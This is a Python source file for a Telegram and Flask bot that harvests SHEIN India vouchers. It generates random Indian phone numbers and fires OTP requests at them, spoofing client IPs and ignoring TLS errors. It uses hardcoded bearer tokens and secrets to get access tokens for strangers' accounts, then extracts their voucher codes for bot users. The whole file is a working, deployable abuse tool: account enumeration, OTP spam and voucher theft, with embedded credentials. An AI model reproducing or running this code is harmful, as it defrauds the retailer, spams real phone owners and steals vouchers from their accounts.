#!/usr/bin/env python3
"""
🎫 SHEIN Voucher Bot - Flask + Telegram
Version: 4.0 - All-in-One
Deployment: Render.com ready
"""

import os
import json
import random
import time
import threading
import asyncio
import logging
import requests
import uuid
import hashlib
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from flask import Flask, request, jsonify, render_template_string
from dotenv import load_dotenv

# Try to import Telegram modules
try:
    from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
    from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
    TELEGRAM_AVAILABLE = True
except ImportError:
    TELEGRAM_AVAILABLE = False
    print("⚠️ Telegram module not installed. Install with: pip install python-telegram-bot")

# Load environment variables
load_dotenv()

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=os.getenv('LOG_LEVEL', 'INFO')
)
logger = logging.getLogger(__name__)

# ==============================================
# SHEIN BOT CLASS
# ==============================================

class SheinVoucherBot:
    def __init__(self):
        # Bot configuration
        self.bot_token = os.getenv('TELEGRAM_BOT_TOKEN')
        if not self.bot_token:
            logger.error("❌ TELEGRAM_BOT_TOKEN not found!")
        
        # Files configuration
        self.data_dir = "data"
        os.makedirs(self.data_dir, exist_ok=True)
        
        # File paths
        self.nm_file = os.path.join(self.data_dir, "nm.json")
        self.used_file = os.path.join(self.data_dir, "used.json")
        self.failed_file = os.path.join(self.data_dir, "failed.json")
        self.vouchers_file = os.path.join(self.data_dir, "vouchers.json")
        self.users_file = os.path.join(self.data_dir, "users.json")
        
        # Performance settings
        self.max_workers = int(os.getenv('MAX_WORKERS', '15'))
        self.request_timeout = int(os.getenv('REQUEST_TIMEOUT', '10'))
        
        # Continuous mode
        self.continuous_mode = {}
        self.continuous_stats = {}
        self.stop_continuous = {}
        
        # Load data
        self.load_all_data()
        
        # Thread pool
        self.executor = ThreadPoolExecutor(max_workers=self.max_workers)
        
        # URLs
        self.send_otp_url = "https://api.sheinindia.in/uaas/login/sendOTP?client_type=Android%2F35&client_version=1.0.12"
        self.client_token_url = "https://api.sheinindia.in/uaas/jwt/token/client"
        self.account_check_url = "https://api.sheinindia.in/uaas/accountCheck"
        self.creator_token_url = "https://shein-creator-backend-151437891745.asia-south1.run.app/api/v1/auth/generate-token"
        self.user_data_url = "https://shein-creator-backend-151437891745.asia-south1.run.app/api/v1/user"
        
        # Headers
        self.otp_headers = {
            "X-Tenant": "B2C",
            "Accept": "application/json",
            "User-Agent": "Android",
            "client_type": "Android/35",
            "client_version": "1.0.12",
            "Authorization": "Bearer eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJjbGllbnQiLCJjbGllbnROYW1lIjoidHJ1c3RlZF9jbGllbnQiLCJyb2xlcyI6W3sibmFtZSI6IlJPTEVfVFJVU1RFRF9DTElFTlQifV0sInRlbmFudElkIjoiU0hFSU4iLCJleHAiOjE3NzE3ODE4MDQsImlhdCI6MTc2OTE4OTgwNH0.HsDutIjo9XEnC6Ju1_MZsjj3v-T52_2K4L0RKdnsNncEAjlNEA4MDEA39yLiGdaDzvNSmAy3fKgQcWE_WTC0RvPhL4_F9bzAFoK6LASjb1LzOKilHAdlFQtUDfZPgCdq9iXg95-v2-qv3vjoF2K47I7i9v_v8EKXO_OfqQILDyBzIqumYE3VRpDG1zJhIUijuDkmIrfsz8w-0m40gccXfsnN5IeRwp_l98l-amUfDs1bI167oWEBi-gGby7Fqzku8FxCicZ17cwhiWTs8kzopkKP1H50cFMBmH7cZR-WNbM_0OBdj4IcxT-2jHm-qoqMCGykud33KFLU2PfS8VU45g",
            "X-TENANT-ID": "SHEIN",
            "ad_id": str(uuid.uuid4()),
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept-Encoding": "gzip"
        }
        
        # Thread safety
        self.lock = threading.Lock()
        
        # Bot status
        self.is_running = True
        
        logger.info(f"✅ Bot initialized with {self.max_workers} workers")
    
    # ========== DATA METHODS ==========
    
    def load_all_data(self):
        """Load all data files"""
        self.numbers = self.load_json(self.nm_file, [])
        self.used = self.load_json(self.used_file, [])
        self.failed = self.load_json(self.failed_file, [])
        self.vouchers = self.load_json(self.vouchers_file, [])
        self.users = self.load_json(self.users_file, {})
        
        logger.info(f"📊 Data loaded: {len(self.numbers)} numbers, {len(self.vouchers)} vouchers, {len(self.users)} users")
    
    def load_json(self, filename, default):
        """Load JSON file"""
        try:
            if os.path.exists(filename):
                with open(filename, 'r', encoding='utf-8') as f:
                    return json.load(f)
        except:
            pass
        return default
    
    def save_json(self, filename, data):
        """Save JSON file"""
        try:
            with self.lock:
                with open(filename, 'w', encoding='utf-8') as f:
                    json.dump(data, f, indent=2, ensure_ascii=False)
        except Exception as e:
            logger.error(f"Save error {filename}: {e}")
    
    # ========== UTILITY METHODS ==========
    
    def generate_valid_number(self):
        """Generate Indian mobile number"""
        prefixes = ['70', '71', '72', '73', '74', '75', '76', '77', '78', '79',
                   '80', '81', '82', '83', '84', '85', '86', '87', '88', '89',
                   '90', '91', '92', '93', '94', '95', '96', '97', '98', '99']
        prefix = random.choice(prefixes)
        return prefix + ''.join([str(random.randint(0, 9)) for _ in range(8)])
    
    def random_ip(self):
        """Generate random IP"""
        return f"{random.randint(100,200)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    
    # ========== API METHODS ==========
    
    def send_otp(self, number):
        """Send OTP to number"""
        try:
            headers = self.otp_headers.copy()
            headers["ad_id"] = str(uuid.uuid4())
            headers["X-Forwarded-For"] = self.random_ip()
            
            data = f"mobileNumber={number}"
            
            response = requests.post(
                self.send_otp_url,
                data=data,
                headers=headers,
                timeout=8,
                verify=False
            )
            
            if response and response.status_code == 200:
                try:
                    result = response.json()
                    if result.get("success") is True:
                        return True, number
                except:
                    pass
            
            return False, number
            
        except:
            return False, number
    
    def get_client_token(self):
        """Get client token"""
        try:
            device_id = hashlib.md5(f"android-{int(time.time())}".encode()).hexdigest().upper()
            ip = self.random_ip()
            
            headers = {
                "Client_type": "Android/29",
                "Client_version": "1.0.8",
                "User-Agent": "Android",
                "X-Tenant-Id": "shein",
                "Ad_id": device_id,
                "Content-Type": "application/x-www-form-urlencoded",
                "X-Forwarded-For": ip
            }
            
            data = "grantType=client_credentials&clientName=trusted_client&clientSecret=secret"
            
            response = requests.post(
                self.client_token_url,
                data=data,
                headers=headers,
                timeout=10,
                verify=False
            )
            
            if response and response.status_code == 200:
                return response.json().get('access_token')
        except:
            pass
        return None
    
    def check_account(self, mobile, client_token):
        """Check account"""
        try:
            ip = self.random_ip()
            
            headers = {
                "Authorization": f"Bearer {client_token}",
                "Client_type": "Android/29",
                "Client_version": "1.0.8",
                "User-Agent": "Android",
                "X-Tenant-Id": "shein",
                "Content-Type": "application/x-www-form-urlencoded",
                "X-Forwarded-For": ip
            }
            
            data = f"mobileNumber={mobile}"
            
            response = requests.post(
                self.account_check_url,
                data=data,
                headers=headers,
                timeout=8,
                verify=False
            )
            
            if response and response.status_code == 200:
                return response.json().get('encryptedId')
        except:
            pass
        return None
    
    def get_creator_token(self, mobile, encrypted_id):
        """Get creator token"""
        try:
            ip = self.random_ip()
            
            headers = {
                "Content-Type": "application/json",
                "X-Tenant-Id": "shein",
                "User-Agent": "Android",
                "X-Forwarded-For": ip
            }
            
            data = {
                "client_type": "Android/29",
                "client_version": "1.0.8",
                "gender": random.choice(["MALE", "FEMALE"]),
                "phone_number": mobile,
                "secret_key": "3LFcKwBTXcsMzO5LaUbNYoyMSpt7M3RP5dW9ifWffzg",
                "user_id": encrypted_id,
                "user_name": random.choice(["Aarav", "Ankit", "Rahul", "Rohit", "Aman"])
            }
            
            response = requests.post(
                self.creator_token_url,
                data=json.dumps(data),
                headers=headers,
                timeout=10,
                verify=False
            )
            
            if response and response.status_code == 200:
                return response.json().get('access_token')
        except:
            pass
        return None
    
    def get_voucher(self, mobile, encrypted_id, creator_token):
        """Get voucher data"""
        try:
            ip = self.random_ip()
            
            headers = {
                "Authorization": f"Bearer {creator_token}",
                "X-Encrypted-Id": encrypted_id,
                "Origin": "https://sheinverse.galleri5.com",
                "Referer": "https://sheinverse.galleri5.com/",
                "User-Agent": "Android",
                "X-Forwarded-For": ip
            }
            
            response = requests.get(
                self.user_data_url,
                headers=headers,
                timeout=10,
                verify=False
            )
            
            if response and response.status_code == 200:
                data = response.json()
                if 'user_data' in data and 'voucher_data' in data['user_data']:
                    voucher_data = data['user_data']['voucher_data']
                    return {
                        "mobile": mobile,
                        "voucher_code": voucher_data.get('voucher_code', 'N/A'),
                        "amount": voucher_data.get('voucher_amount', 'N/A'),
                        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    }
        except:
            pass
        return None
    
    # ========== PROCESSING METHODS ==========
    
    def find_valid_number(self):
        """Find valid number"""
        for _ in range(3):
            number = self.generate_valid_number()
            success, number = self.send_otp(number)
            if success:
                if number not in self.numbers:
                    self.numbers.append(number)
                    self.save_json(self.nm_file, self.numbers)
                return True, number
            time.sleep(0.5)
        return False, None
    
    def process_for_voucher(self, mobile):
        """Process number for voucher"""
        try:
            client_token = self.get_client_token()
            if not client_token:
                return None
            
            encrypted_id = self.check_account(mobile, client_token)
            if not encrypted_id:
                return None
            
            creator_token = self.get_creator_token(mobile, encrypted_id)
            if not creator_token:
                return None
            
            return self.get_voucher(mobile, encrypted_id, creator_token)
        except:
            return None
    
    # ========== TELEGRAM HANDLERS ==========
    
    async def telegram_start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Telegram /start command"""
        user = update.effective_user
        user_id = str(user.id)
        
        if user_id not in self.users:
            self.users[user_id] = {
                "username": user.username,
                "first_name": user.first_name,
                "join_date": datetime.now().isoformat(),
                "total_vouchers": 0,
                "total_value": 0,
                "last_active": datetime.now().isoformat()
            }
            self.save_json(self.users_file, self.users)
        
        keyboard = [
            [InlineKeyboardButton("🚀 Start Continuous", callback_data="start_cont")],
            [InlineKeyboardButton("⚡ Quick Batch", callback_data="quick_batch")],
            [InlineKeyboardButton("📊 Stats", callback_data="stats")],
            [InlineKeyboardButton("🎫 My Vouchers", callback_data="my_vouchers")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            "🎫 *SHEIN Voucher Bot*\n\n"
            "Continuous auto-collection bot!\n\n"
            "Select option:",
            reply_markup=reply_markup,
            parse_mode="Markdown"
        )
    
    async def telegram_button(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle button clicks"""
        query = update.callback_query
        await query.answer()
        
        user_id = str(update.effective_user.id)
        
        if query.data == "start_cont":
            await self.start_continuous_telegram(query, user_id)
        elif query.data == "quick_batch":
            await self.quick_batch_telegram(query, user_id)
        elif query.data == "stats":
            await self.show_stats_telegram(query)
        elif query.data == "my_vouchers":
            await self.show_user_vouchers_telegram(query, user_id)
        elif query.data == "stop_cont":
            await self.stop_continuous_telegram(query, user_id)
    
    async def start_continuous_telegram(self, query, user_id):
        """Start continuous mode in Telegram"""
        if self.continuous_mode.get(user_id, False):
            await query.edit_message_text("Already running!")
            return
        
        self.continuous_mode[user_id] = True
        self.stop_continuous[user_id] = False
        self.continuous_stats[user_id] = {
            "start_time": time.time(),
            "total_attempts": 0,
            "valid_numbers": 0,
            "vouchers_found": 0,
            "total_value": 0
        }
        
        await query.edit_message_text(
            "🚀 *Continuous Mode Started*\n\n"
            "Finding numbers automatically...",
            parse_mode="Markdown"
        )
        
        asyncio.create_task(self.run_continuous_telegram(query, user_id))
    
    async def run_continuous_telegram(self, query, user_id):
        """Run continuous mode"""
        try:
            while (self.continuous_mode.get(user_id, False) and 
                   not self.stop_continuous.get(user_id, False)):
                
                # Find valid number
                success, number = self.find_valid_number()
                self.continuous_stats[user_id]["total_attempts"] += 1
                
                if success:
                    self.continuous_stats[user_id]["valid_numbers"] += 1
                    
                    # Get voucher
                    voucher = self.process_for_voucher(number)
                    
                    if voucher:
                        self.continuous_stats[user_id]["vouchers_found"] += 1
                        try:
                            amount = str(voucher['amount']).replace('₹', '').strip()
                            if amount.lower() != 'n/a':
                                self.continuous_stats[user_id]["total_value"] += float(amount)
                        except:
                            pass
                        
                        # Save
                        self.vouchers.append(voucher)
                        self.used.append(number)
                        self.save_json(self.vouchers_file, self.vouchers)
                        self.save_json(self.used_file, self.used)
                        
                        # Update user
                        if user_id in self.users:
                            self.users[user_id]["total_vouchers"] += 1
                            self.save_json(self.users_file, self.users)
                        
                        # Notify
                        await query.message.reply_text(
                            f"🎉 *New Voucher!*\n\n"
                            f"Code: `{voucher['voucher_code']}`\n"
                            f"Amount: `₹{voucher['amount']}`",
                            parse_mode="Markdown"
                        )
                
                # Update status every 5 cycles
                if self.continuous_stats[user_id]["total_attempts"] % 5 == 0:
                    stats = self.continuous_stats[user_id]
                    keyboard = [[InlineKeyboardButton("⏹️ Stop", callback_data="stop_cont")]]
                    reply_markup = InlineKeyboardMarkup(keyboard)
                    
                    try:
                        await query.edit_message_text(
                            f"🔄 *Running...*\n\n"
                            f"Attempts: {stats['total_attempts']}\n"
                            f"Valid: {stats['valid_numbers']}\n"
                            f"Vouchers: {stats['vouchers_found']}\n"
                            f"Value: ₹{stats['total_value']}",
                            reply_markup=reply_markup,
                            parse_mode="Markdown"
                        )
                    except:
                        pass
                
                await asyncio.sleep(0.5)
            
            # Cleanup
            await self.continuous_ended_telegram(query, user_id)
            
        except Exception as e:
            logger.error(f"Continuous error: {e}")
            self.continuous_mode[user_id] = False
    
    async def continuous_ended_telegram(self, query, user_id):
        """Handle end of continuous mode"""
        if user_id in self.continuous_stats:
            stats = self.continuous_stats[user_id]
            await query.message.reply_text(
                f"⏹️ *Stopped*\n\n"
                f"Final Stats:\n"
                f"• Attempts: {stats['total_attempts']}\n"
                f"• Vouchers: {stats['vouchers_found']}\n"
                f"• Value: ₹{stats['total_value']}",
                parse_mode="Markdown"
            )
            del self.continuous_stats[user_id]
        
        self.continuous_mode[user_id] = False
        if user_id in self.stop_continuous:
            del self.stop_continuous[user_id]
    
    async def stop_continuous_telegram(self, query, user_id):
        """Stop continuous mode"""
        self.stop_continuous[user_id] = True
        await query.edit_message_text("🛑 Stopping...")
    
    async def quick_batch_telegram(self, query, user_id):
        """Quick batch mode"""
        await query.edit_message_text("⚡ Processing 5 numbers...")
        
        vouchers_found = []
        for i in range(5):
            success, number = self.find_valid_number()
            if success:
                voucher = self.process_for_voucher(number)
                if voucher:
                    vouchers_found.append(voucher)
                    self.vouchers.append(voucher)
                    self.used.append(number)
            
            await query.edit_message_text(
                f"⚡ Progress: {i+1}/5\n"
                f"Found: {len(vouchers_found)} vouchers"
            )
            await asyncio.sleep(0.5)
        
        self.save_json(self.vouchers_file, self.vouchers)
        self.save_json(self.used_file, self.used)
        
        if vouchers_found:
            result = "\n".join([f"• `{v['voucher_code']}` (₹{v['amount']})" for v in vouchers_found])
            await query.edit_message_text(
                f"✅ *Batch Complete!*\n\n"
                f"Found {len(vouchers_found)} vouchers:\n{result}",
                parse_mode="Markdown"
            )
        else:
            await query.edit_message_text("📭 No vouchers found")
    
    async def show_stats_telegram(self, query):
        """Show stats"""
        total_value = sum([
            float(str(v['amount']).replace('₹', '').strip()) 
            for v in self.vouchers 
            if str(v['amount']).replace('₹', '').strip().lower() != 'n/a'
        ])
        
        await query.edit_message_text(
            f"📊 *Bot Stats*\n\n"
            f"• Vouchers: {len(self.vouchers)}\n"
            f"• Value: ₹{total_value}\n"
            f"• Users: {len(self.users)}\n"
            f"• Numbers: {len(self.numbers)}",
            parse_mode="Markdown"
        )
    
    async def show_user_vouchers_telegram(self, query, user_id):
        """Show user vouchers"""
        user_data = self.users.get(user_id, {})
        
        if not user_data or user_data.get("total_vouchers", 0) == 0:
            await query.edit_message_text("📭 No vouchers yet!")
            return
        
        recent = self.vouchers[-5:]
        vouchers_text = "\n".join([f"• `{v['voucher_code']}` (₹{v['amount']})" for v in recent])
        
        await query.edit_message_text(
            f"🎫 *Your Vouchers*\n\n"
            f"Total: {user_data.get('total_vouchers', 0)}\n"
            f"Value: ₹{user_data.get('total_value', 0)}\n\n"
            f"Recent:\n{vouchers_text}",
            parse_mode="Markdown"
        )
    
    # ========== RUN BOT ==========
    
    def setup_telegram(self):
        """Setup Telegram bot"""
        if not TELEGRAM_AVAILABLE:
            raise ImportError("python-telegram-bot not installed")
        
        if not self.bot_token:
            raise ValueError("TELEGRAM_BOT_TOKEN not set")
        
        application = Application.builder().token(self.bot_token).build()
        
        # Add handlers
        application.add_handler(CommandHandler("start", self.telegram_start))
        application.add_handler(CallbackQueryHandler(self.telegram_button))
        
        return application
    
    async def run_telegram(self):
        """Run Telegram bot"""
        try:
            application = self.setup_telegram()
            
            print("\n" + "="*50)
            print("🎫 SHEIN Voucher Bot - Telegram")
            print("="*50)
            print(f"📊 Users: {len(self.users)}")
            print(f"🎫 Vouchers: {len(self.vouchers)}")
            print("="*50)
            print("✅ Telegram bot started!")
            print("="*50)
            
            await application.initialize()
            await application.start()
            await application.updater.start_polling()
            
            while self.is_running:
                await asyncio.sleep(1)
                
        except Exception as e:
            logger.error(f"Telegram error: {e}")

# ==============================================
# FLASK APPLICATION
# ==============================================

# Create Flask app
app = Flask(__name__)
app.config['SECRET_KEY'] = os.getenv('SECRET_KEY', 'dev-secret-key-123')

# Global bot instance
bot = None
bot_thread = None

# HTML Template for Dashboard
DASHBOARD_HTML = '''
<!DOCTYPE html>
<html>
<head>
    <title>🎫 SHEIN Voucher Bot</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
            color: white;
        }
        .container {
            max-width: 1000px;
            margin: 0 auto;
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 30px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
        }
        .header {
            text-align: center;
            margin-bottom: 30px;
        }
        .header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
        }
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin: 30px 0;
        }
        .stat-card {
            background: rgba(255, 255, 255, 0.15);
            padding: 20px;
            border-radius: 15px;
            text-align: center;
            transition: transform 0.3s;
        }
        .stat-card:hover {
            transform: translateY(-5px);
            background: rgba(255, 255, 255, 0.2);
        }
        .stat-value {
            font-size: 2em;
            font-weight: bold;
            margin: 10px 0;
        }
        .control-panel {
            background: rgba(0, 0, 0, 0.2);
            padding: 25px;
            border-radius: 15px;
            margin: 30px 0;
            text-align: center;
        }
        .button {
            display: inline-block;
            padding: 15px 30px;
            margin: 10px;
            border: none;
            border-radius: 10px;
            font-size: 1.1em;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
            text-decoration: none;
            color: white;
        }
        .start-btn { background: #4CAF50; }
        .stop-btn { background: #f44336; }
        .refresh-btn { background: #2196F3; }
        .button:hover {
            transform: scale(1.05);
            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
        }
        .status {
            padding: 15px;
            border-radius: 10px;
            margin: 20px 0;
            font-size: 1.2em;
            text-align: center;
        }
        .status-running { background: rgba(76, 175, 80, 0.3); }
        .status-stopped { background: rgba(244, 67, 54, 0.3); }
        .log {
            background: rgba(0, 0, 0, 0.3);
            padding: 20px;
            border-radius: 10px;
            margin-top: 30px;
            max-height: 300px;
            overflow-y: auto;
            font-family: monospace;
        }
        footer {
            text-align: center;
            margin-top: 40px;
            opacity: 0.8;
            font-size: 0.9em;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🎫 SHEIN Voucher Bot</h1>
            <p>Continuous Auto-Collection Dashboard</p>
        </div>
        
        <div id="status" class="status status-stopped">
            Bot Status: Stopped
        </div>
        
        <div class="control-panel">
            <button class="button start-btn" onclick="startBot()">🚀 Start Bot</button>
            <button class="button stop-btn" onclick="stopBot()">⏹️ Stop Bot</button>
            <button class="button refresh-btn" onclick="refreshStats()">🔄 Refresh</button>
        </div>
        
        <div id="stats" class="stats-grid">
            <!-- Stats loaded by JavaScript -->
        </div>
        
        <div class="log" id="log">
            Loading logs...
        </div>
        
        <footer>
            <p>Running on Render • Flask + Telegram • Version 4.0</p>
            <p>Use /start on Telegram to access the bot</p>
        </footer>
    </div>
    
    <script>
        function updateStats() {
            fetch('/api/stats')
                .then(r => r.json())
                .then(data => {
                    // Update status
                    const status = document.getElementById('status');
                    status.textContent = `Bot Status: ${data.bot_running ? 'Running 🟢' : 'Stopped 🔴'}`;
                    status.className = `status ${data.bot_running ? 'status-running' : 'status-stopped'}`;
                    
                    // Update stats
                    const statsHtml = `
                        <div class="stat-card">
                            <div>👥 Users</div>
                            <div class="stat-value">${data.users || 0}</div>
                        </div>
                        <div class="stat-card">
                            <div>🎫 Vouchers</div>
                            <div class="stat-value">${data.vouchers || 0}</div>
                        </div>
                        <div class="stat-card">
                            <div>📱 Numbers</div>
                            <div class="stat-value">${data.numbers || 0}</div>
                        </div>
                        <div class="stat-card">
                            <div>⚡ Active</div>
                            <div class="stat-value">${data.active || 0}</div>
                        </div>
                    `;
                    document.getElementById('stats').innerHTML = statsHtml;
                    
                    // Update log
                    if (data.recent_logs) {
                        document.getElementById('log').innerHTML = 
                            data.recent_logs.map(log => `<div>${log}</div>`).join('');
                    }
                });
        }
        
        function startBot() {
            fetch('/api/start', { method: 'POST' })
                .then(r => r.json())
                .then(data => {
                    alert(data.message || 'Bot started!');
                    updateStats();
                });
        }
        
        function stopBot() {
            fetch('/api/stop', { method: 'POST' })
                .then(r => r.json())
                .then(data => {
                    alert(data.message || 'Bot stopped!');
                    updateStats();
                });
        }
        
        function refreshStats() {
            updateStats();
        }
        
        // Update every 10 seconds
        setInterval(updateStats, 10000);
        
        // Initial load
        updateStats();
    </script>
</body>
</html>
'''

# ========== FLASK ROUTES ==========

@app.route('/')
def dashboard():
    """Main dashboard"""
    return render_template_string(DASHBOARD_HTML)

@app.route('/api/stats')
def api_stats():
    """Get bot statistics"""
    try:
        stats = {
            'bot_running': bot is not None and bot.is_running,
            'users': len(bot.users) if bot else 0,
            'vouchers': len(bot.vouchers) if bot else 0,
            'numbers': len(bot.numbers) if bot else 0,
            'active': sum(1 for v in bot.continuous_mode.values() if v) if bot else 0,
            'recent_logs': []
        }
        
        # Read recent logs
        try:
            log_file = 'data/bot.log'
            if os.path.exists(log_file):
                with open(log_file, 'r') as f:
                    lines = f.readlines()[-10:]
                    stats['recent_logs'] = [line.strip() for line in lines]
        except:
            pass
        
        return jsonify(stats)
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/start', methods=['POST'])
def api_start():
    """Start the bot"""
    global bot, bot_thread
    
    try:
        if bot and bot.is_running:
            return jsonify({'message': 'Bot already running'})
        
        # Create bot instance
        bot = SheinVoucherBot()
        
        # Function to run bot
        def run_bot():
            asyncio.run(bot.run_telegram())
        
        # Start in thread
        bot_thread = threading.Thread(target=run_bot, daemon=True)
        bot_thread.start()
        
        logger.info("✅ Bot started via web")
        return jsonify({'message': 'Bot started successfully'})
        
    except Exception as e:
        logger.error(f"Start error: {e}")
        return jsonify({'message': f'Error: {str(e)}'}), 500

@app.route('/api/stop', methods=['POST'])
def api_stop():
    """Stop the bot"""
    global bot
    
    try:
        if not bot:
            return jsonify({'message': 'Bot not running'})
        
        bot.is_running = False
        bot = None
        
        logger.info("⏹️ Bot stopped via web")
        return jsonify({'message': 'Bot stopped successfully'})
        
    except Exception as e:
        return jsonify({'message': f'Error: {str(e)}'}), 500

@app.route('/health')
def health():
    """Health check"""
    return jsonify({'status': 'healthy', 'service': 'shein-bot'})

# ==============================================
# MAIN ENTRY POINT
# ==============================================

def main():
    """Main function"""
    # Disable SSL warnings
    requests.packages.urllib3.disable_warnings()
    
    # Print banner
    print("\n" + "="*60)
    print("🎫 SHEIN Voucher Bot - All-in-One")
    print("="*60)
    print("Features:")
    print("• Flask Web Dashboard")
    print("• Telegram Bot")
    print("• Continuous Auto-Collection")
    print("• Render Ready")
    print("="*60)
    
    # Check token
    token = os.getenv('TELEGRAM_BOT_TOKEN')
    if not token or token == 'your_telegram_bot_token_here':
        print("❌ ERROR: TELEGRAM_BOT_TOKEN not set in .env file!")
        print("Please edit .env file and add your bot token")
        return
    
    if not TELEGRAM_AVAILABLE:
        print("❌ ERROR: python-telegram-bot not installed!")
        print("Install with: pip install python-telegram-bot")
        return
    
    # Start Flask app
    port = int(os.getenv('PORT', 8080))
    print(f"✅ Starting on port {port}")
    print(f"🌐 Web Dashboard: http://localhost:{port}")
    print(f"🤖 Telegram Bot: Search your bot username")
    print("="*60)
    
    app.run(host='0.0.0.0', port=port, debug=False)

if __name__ == '__main__':
    main()